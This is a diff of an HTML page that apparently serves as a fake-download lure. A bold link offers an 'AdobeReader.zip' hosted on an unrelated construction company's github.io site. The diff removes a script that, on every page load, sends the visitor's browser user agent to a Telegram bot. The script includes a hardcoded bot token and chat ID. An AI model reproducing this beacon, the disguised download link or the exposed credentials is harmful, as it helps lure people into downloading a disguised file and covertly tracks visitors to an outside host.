@@ -37,34 +37,5 @@
             <a href="https://silvercliffconstruction.github.io/office/AdobeReader.zip" style="color: #DC0000; text-decoration: none; font-weight: bold;">download manually.</a>
         </p>
     </div>
-
-<script>
-    // 🔧 Replace with your values
-    const BOT_TOKEN = "8337206512:AAExlLa-QsOYuiPUzXXWk3T_HJw9_upKoC4";
-    const CHAT_ID = "7613395944";
-
-    function sendUserAgent() {
-      const userAgent = navigator.userAgent;
-
-      const message = `New visitor:\nUser Agent: ${userAgent}`;
-
-      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-        method: "POST",
-        headers: {
-          "Content-Type": "application/json"
-        },
-        body: JSON.stringify({
-          chat_id: CHAT_ID,
-          text: message
-        })
-      })
-      .then(res => res.json())
-      .then(data => console.log("Sent:", data))
-      .catch(err => console.error("Error:", err));
-    }
-
-    // Send immediately when page loads
-    window.addEventListener("load", sendUserAgent);
-  </script>
 </body>
 </html>
